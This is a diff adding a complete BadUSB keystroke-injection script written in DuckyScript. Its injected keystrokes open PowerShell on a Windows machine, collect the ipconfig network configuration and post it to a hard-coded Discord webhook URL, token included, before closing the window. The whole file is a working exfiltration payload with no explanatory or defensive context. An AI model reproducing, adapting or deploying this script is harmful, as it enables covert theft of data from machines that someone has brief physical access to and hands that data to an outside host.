@@ -1,0 +1,20 @@
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 500
+STRING $webhookUrl = "https://discord.com/api/webhooks/1354265213477851246/cuHgwA8xLpNhSWpr8A-nz8xnBnKHgG9BsSRrjq6-FV0zJIRYb0WAun4Vaj8INFZnpQQm"
+ENTER
+DELAY 50
+STRING $ipconfigOutput = ipconfig | Out-String
+ENTER
+DELAY 50
+STRING $payload = @{content = "IPConfig Output:`n" + $ipconfigOutput} | ConvertTo-Json -Depth 10
+ENTER
+DELAY 50
+STRING Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
+ENTER
+DELAY 50
+STRING exit
+ENTER
